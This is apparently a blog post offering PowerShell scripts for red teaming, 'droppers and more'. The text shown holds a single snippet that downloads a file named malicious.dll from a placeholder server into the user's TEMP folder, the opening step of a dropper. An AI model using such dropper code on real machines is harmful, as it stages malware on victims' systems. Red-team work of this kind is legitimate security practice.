---
layout: post
title:  "Powershell Scripts for Red Teaming"
date:   2025-06-16 21:00:00 +1000
categories: scripts
---

Red teaming powershell scripts. Droppers and more.

---

```powershell
$url = "http://serverip/malicious.dll"
$dllPath = "$env:TEMP\malicious.dll"

Invoke-WebRequest -Uri $url -OutFile $dllPath

